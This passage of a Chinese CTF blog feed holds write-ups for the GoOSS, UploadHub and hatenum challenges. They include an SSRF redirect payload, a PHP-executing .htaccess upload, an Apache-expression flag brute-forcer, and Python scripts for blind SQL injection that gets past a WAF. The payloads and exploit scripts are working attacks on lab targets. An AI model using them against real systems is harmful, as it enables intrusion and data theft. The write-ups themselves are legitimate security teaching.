class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;file upload succ, path: &quot;</span>+dir+<span class="string">&quot;/&quot;</span>+filename,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">vulController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url Url</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;url); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !strings.HasPrefix(url.Url,<span class="string">&quot;http://127.0.0.1:1234/&quot;</span>)&#123;</span><br><span class="line">c.JSON(<span class="number">403</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;url forbidden&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">client := &amp;http.Client&#123;Timeout: <span class="number">2</span> * time.Second&#125;</span><br><span class="line"></span><br><span class="line">resp, err := client.Get(url.Url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"><span class="keyword">var</span> buffer [<span class="number">512</span>]<span class="keyword">byte</span></span><br><span class="line">result := bytes.NewBuffer(<span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">n, err := resp.Body.Read(buffer[<span class="number">0</span>:])</span><br><span class="line">result.Write(buffer[<span class="number">0</span>:n])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err == io.EOF &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;data&quot;</span>: result.String()&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.Use(fileMidderware)</span><br><span class="line">r.POST(<span class="string">&quot;/vul&quot;</span>,vulController)</span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>,uploadController)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;pong&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">_ = r.Run(<span class="string">&quot;:1234&quot;</span>) <span class="comment">// listen and serve on 0.0.0.0:8080</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;upload 上传文件的</span><br><span class="line">&#x2F;vul 代理路由，可以通过这里实现SSRF,要求url前缀为http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;</span><br><span class="line">现在就是如何绕过这个限制，访问到80端口</span><br></pre></td></tr></table></figure><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>注意到有个重定向</p><p>需要满足<code>c.Request.URL.String()</code>是一个目录而不是文件名，我们需要在file下有文件夹</p><p>上传文件可以帮你完成这个目标</p><p><img src="/2021/07/29/JMCTF-2021-GoOSS/Snipaste_2021-07-29_22-57-00.png"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;Url&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php?file&#x3D;&#x2F;flag&amp;a&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;098f6bcd4621d373cade4e832627b4f6&quot;&#125;</span><br></pre></td></tr></table></figure><p>这个payload，利用目录穿越的特点，保持访问这个目录的存在，重定向<code>//127.0.0.1:80</code></p><p><img src="/2021/07/29/JMCTF-2021-GoOSS/Snipaste_2021-07-29_22-57-22.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h3&gt;&lt;p&gt;80端口有index.php&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="golang web" scheme="https://123-prog.github.io/categories/CTF/golang-web/"/>
    
    
    <category term="ssrf" scheme="https://123-prog.github.io/tags/ssrf/"/>
    
    <category term="重定向" scheme="https://123-prog.github.io/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>(JMCTF 2021)UploadHub</title>
    <link href="https://123-prog.github.io/2021/07/29/JMCTF-2021-UploadHub/"/>
    <id>https://123-prog.github.io/2021/07/29/JMCTF-2021-UploadHub/</id>
    <published>2021-07-29T04:11:22.000Z</published>
    <updated>2021-09-22T10:16:28.187Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><a id="more"></a><p>给了源码和一些配置文件，源码有关sql部分都是迷惑人的，这题是文件上传的题</p><p>在<code>apache2.conf</code>中，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory ~ &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;[a-f0-9]&#123;32&#125;&#x2F;&quot;&gt;</span><br><span class="line">        php_flag engine off</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure><p>上传目录下的php解析被关闭了</p><p>但是又注意到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &#x2F;var&#x2F;www&#x2F;&gt;</span><br><span class="line">Options  Indexes FollowSymLinks</span><br><span class="line">AllowOverride All </span><br><span class="line">Require all granted</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure><p><code>AllowOverride</code>被设置<code>All</code>，这个值为<code>None</code>的时候是不会搜索这个目录下的<code>.htaccess</code>文件的，但这里代表我们可以通过上传<code>.htaccess</code>文件更改上传目录的配置，那前面的解析关闭就不是问题了</p><h3 id="0x02-上传-htaccess文件"><a href="#0x02-上传-htaccess文件" class="headerlink" title="0x02 上传.htaccess文件"></a>0x02 上传.htaccess文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.htaccess&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">Require all granted</span><br><span class="line">php_flag engine 1</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">#&lt;?php readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure><p><code>php_flag</code>更改配置engine的布尔值，启动php解析，这里<code>php_flag</code>不能放在<code>FilesMatch</code>外面大概是优先级问题，待研究</p><p>.htaccess的使用，可以参考这个<a href="https://cloud.tencent.com/developer/article/1824057">https://cloud.tencent.com/developer/article/1824057</a></p><blockquote><p>除此之外<code>php_value</code>也可以更改配置（不可以更改布尔值）</p><p>当php是作为apache的模块作用时，可以在apache配置文件中使用它们更改php的配置</p><p>当然不是所有配置都可以通过这个方式更改，哪些可以更改的可以查一下官方文档</p></blockquote><p>payload这里可能有点绕，上面的payload的作用过程应该是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.请求upload下的.htaccess</span><br><span class="line">2.根据配置，开启了.htaccess的使用，apache就会寻找这个目录下的.htaccess文件，应用其中配置，我们在其中写了一个文件匹配，匹配.htaccess文件，我们访问的就是这个文件，所以匹配成功，应用FilesMatch中的配置，为.htaccess指定处理器为php，开启engine</span><br><span class="line">3.这时候的.htaccess已经被当作php文件来看了，所以在下面写php代码，可以解析</span><br></pre></td></tr></table></figure><p>另外，在<code>start.sh</code>中有</p><p><img src="/2021/07/29/JMCTF-2021-UploadHub/Snipaste_2021-07-29_18-06-36.png"></p><p>靶机每1分钟会清理一下上传文件夹的文件，如果上传后访问发现文件不存在，那就是被删了，再试一遍</p><p>上传访问，即可拿到flag</p><p><img src="/2021/07/29/JMCTF-2021-UploadHub/Snipaste_2021-07-29_18-09-28.png"></p><h3 id="0x03-第二种解法"><a href="#0x03-第二种解法" class="headerlink" title="0x03 第二种解法"></a>0x03 第二种解法</h3><p>来自Nu1l的解法，马克一下</p><p>先看一下主要的payload形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;If &quot;file(&#39;&#x2F;flag&#39;)&#x3D;~ &#x2F;flag&#123;&#x2F;&quot;&gt;</span><br><span class="line">ErrorDocument 404 &quot;wupco&quot;</span><br><span class="line">&lt;&#x2F;If&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file():Read contents from a file (including line endings, when present)</span><br><span class="line">file()可以读取文件内容</span><br><span class="line"></span><br><span class="line">word &quot;&#x3D;~&quot; regex</span><br><span class="line">&#x3D;~表示正则匹配</span><br><span class="line"></span><br><span class="line">ErrorDocument 404 &quot;wupco&quot;:在访问不存在页面的时候返回“wupco”</span><br></pre></td></tr></table></figure><p>其他一些函数和表达式可以在文档里面查看</p><p><a href="http://httpd.apache.org/docs/2.4/expr.html">http://httpd.apache.org/docs/2.4/expr.html</a></p><p>由此可以开始注入</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b17d4c2d-6d9d-43fa-8179-558e860c80e4.node4.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line">myIp = <span class="string">&#x27;ebfb2fa6fd1346df575fb4a07e818f3b&#x27;</span></span><br><span class="line"></span><br><span class="line">alp = string.ascii_letters+string.digits+<span class="string">&#x27;&#123;-&#125;&#x27;</span></span><br><span class="line"><span class="comment">#print(alp)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">fileContent = <span class="string">&#x27;&#x27;&#x27;&lt;If &quot;file(&#x27;/flag&#x27;)=~ /^%s/&quot;&gt;</span></span><br><span class="line"><span class="string">ErrorDocument 404 &quot;wupco&quot;</span></span><br><span class="line"><span class="string">&lt;/If&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> alp:</span><br><span class="line">        htaccess = fileContent%(flag+c)</span><br><span class="line">        r1 = requests.post(url+<span class="string">&#x27;/index.php&#x27;</span>, data=&#123;<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess)&#125;)</span><br><span class="line">        r2 = requests.get(url+<span class="string">&#x27;/upload/&#x27;</span>+myIp+<span class="string">&#x27;/a&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wupco&quot;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h3&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="文件上传" scheme="https://123-prog.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term=".htaccess" scheme="https://123-prog.github.io/tags/htaccess/"/>
    
    <category term="文件上传" scheme="https://123-prog.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>(HFCTF 2021 Final)hatenum</title>
    <link href="https://123-prog.github.io/2021/07/28/HFCTF-2021-Final-hatenum/"/>
    <id>https://123-prog.github.io/2021/07/28/HFCTF-2021-Final-hatenum/</id>
    <published>2021-07-28T08:17:54.000Z</published>
    <updated>2021-09-22T10:15:42.280Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><a id="more"></a><p>源码很简单</p><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])&#123;</span><br><span class="line">header(<span class="string">&#x27;location:index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要以<code>admin</code>登录</p><p><code>login.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">array_waf(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$User</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$User</span>-&gt;login(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;success&#x27;</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;login success&#x27;</span>;</span><br><span class="line">header(<span class="string">&#x27;location:home.php&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;fail&#x27;</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;login fail&#x27;</span>;</span><br><span class="line">header(<span class="string">&#x27;location:index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;error&#x27;</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">header(<span class="string">&#x27;location:index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;no use&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>调用<code>User-&gt;login()</code></p><p><img src="/2021/07/28/HFCTF-2021-Final-hatenum/Snipaste_2021-07-28_16-33-18.png"></p><p>没有用预处理，可以注入，存在过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;union|select|or|and|\&#39;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|&#x3D;|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid&#x2F;i</span><br><span class="line"></span><br><span class="line">\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;&#x2F;i</span><br></pre></td></tr></table></figure><p>过滤了单引号，可以用转义符，联合逃逸</p><p>利用<code>exp(710)</code>溢出报错，在查询语句出错的时候会返回一个<code>error</code>，没有出错就是登录失败的信息提醒</p><p><code>payload:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;xxx\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;||username rlike 0x61646d69&amp;&amp;exp(710-(24-length(code)))#&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\x0b&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到admin的code长度为23</p><p>接下来爆code</p><p>主要限制了这个十六进制串的长度变得有点棘手(因为code中有重复子串</p><p>看网上大佬的方法，是从前往后匹配一遍，再从后往前匹配一遍，结合分析可以拿到长度23的code</p><p>从前往后匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a8b2c06b-9cfa-4e27-b9f9-c150d52e0ca6.node4.buuoj.cn/login.php&#x27;</span></span><br><span class="line">alp = string.ascii_letters+string.digits+<span class="string">&quot;$&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;^&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(<span class="built_in">ord</span>(x))[<span class="number">2</span>:] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> alp:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>) == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">str</span> = <span class="built_in">str</span>[<span class="number">1</span>:]  <span class="comment">#保持payload中str长度为4</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;c4t\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;||username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike binary &#123;&#125;))#&#x27;</span>.<span class="built_in">format</span>(str2hex(<span class="built_in">str</span>+c)).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\x0b&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data[&#x27;password&#x27;])</span></span><br><span class="line">        r = requests.post(url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;login fail&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">str</span> += c</span><br><span class="line">            code += c</span><br><span class="line">            print(<span class="built_in">str</span>+<span class="string">&#x27; &#x27;</span>+code)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2021/07/28/HFCTF-2021-Final-hatenum/Snipaste_2021-07-28_16-57-05.png"></p><p>可以看到，这里出现子串重复，因为是4个4个进行匹配，只要有长度为3的两个子串一样，就会匹配到前面的字串，导致一直循环</p><p>这里是<code>gh2</code>重复了，所以我们只能拿到前一部分<code>erghruigh2uygh2</code></p><p>从后往前匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a8b2c06b-9cfa-4e27-b9f9-c150d52e0ca6.node4.buuoj.cn/login.php&#x27;</span></span><br><span class="line">alp = string.ascii_letters+string.digits+<span class="string">&quot;$&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">data = &#123;</span></span><br><span class="line"><span class="string">    &#x27;username&#x27;:&#x27;c4t\\&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;password&#x27;:&#x27;||username rlike 0x61646d69&amp;&amp;exp(710-(24-length(code)))#&#x27;.replace(&#x27; &#x27;,&#x27;\x0b&#x27;),</span></span><br><span class="line"><span class="string">    &#x27;code&#x27;:&#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;$&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(<span class="built_in">ord</span>(x))[<span class="number">2</span>:] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> alp:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>) == <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">str</span> = <span class="built_in">str</span>[:-<span class="number">1</span>]  <span class="comment">#保持payload中str长度为4</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;c4t\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;||username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike binary &#123;&#125;))#&#x27;</span>.<span class="built_in">format</span>(str2hex(c+<span class="built_in">str</span>)).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\x0b&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data[&#x27;password&#x27;])</span></span><br><span class="line">        </span><br><span class="line">        r = requests.post(url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;login fail&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">str</span> = c + <span class="built_in">str</span></span><br><span class="line">            code = c + code</span><br><span class="line">            print(<span class="built_in">str</span>+<span class="string">&#x27; &#x27;</span>+code)</span><br><span class="line">            <span 